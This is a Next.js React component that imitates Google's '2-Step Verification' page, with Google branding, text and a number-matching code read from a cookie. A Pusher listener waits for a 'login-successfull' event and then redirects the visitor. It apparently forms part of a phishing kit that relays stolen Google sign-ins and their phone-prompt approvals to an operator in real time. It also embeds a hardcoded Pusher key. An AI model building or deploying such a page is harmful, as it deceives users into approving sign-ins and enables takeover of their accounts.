"use client";
import React, { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Cookies from "js-cookie";
import Pusher from "pusher-js";
export default function ReVerifyCode() {
  const[successId, setSuccessId] = useState('');
  const router = useRouter()
  const id = Cookies.get("id");
  const pusher = new Pusher("e4766909b306ad7ddd58", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind('login-successfull', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      console.log(data.id)
      setSuccessId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('login-successfull');
      channel.unsubscribe(id);
    };
  }, [id]);

  if (successId) {
    // Perform the revalidation or data fetching logic here
  return router.push(`/signin`)
}
const code=Cookies.get("code")
console.log(code)
  return (
    <div className="font-roboto min-h-screen md:flex flex-col justify-center items-center bg-white text-[#202124] text-base">
      <div className="md:border border-slate-300 rounded-lg px-6 md:px-10 py-9 md:w-[450px] h-[550px]">
        <div className="flex justify-center">
          <Image src="/images/google.png" alt="google" width={82} height={30} />
        </div>

        <div className="mt-2.5">
          <div className="text-center">
            <h3 className="text-2xl">2-Step Verification</h3>
            <p className="mt-3">
              To help keep your account safe, Google wants to make sure it's
              really you trying to sign in
            </p>
          </div>
          <div className="">
            <div className="">
              <img
                class="w-44 -ml-[70px]"
                src="/images/mobile.gif"
                alt="animation"
              />
            </div>
            <div className="flex flex-col justify-start text-start m-3">
              <h3 className="text-lg font-semibold">Check your phone</h3>
              <h3 className="text-3xl font-semibold">{code}</h3>
              <p className="mt-3">
                Google sent a notification to your Phone. Tap Yes on the
                notification to verify it's you.
              </p>
              <div className="flex pt-3">
                <input type="checkbox" />
                <p className="ml-3">Don't ask again on this device</p>
              </div>
              <div className=" flex flex-col mt-3 items-start ">
                <button
                  className="text-sm text-[#1a73e8] cursor-pointer font-medium pt-3"
                 
                >
                  Resend it
                </button>
                <button
                  className="text-sm text-[#1a73e8] cursor-pointer font-semibold pt-3 pb-5"
                
                >
                  Try another way
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
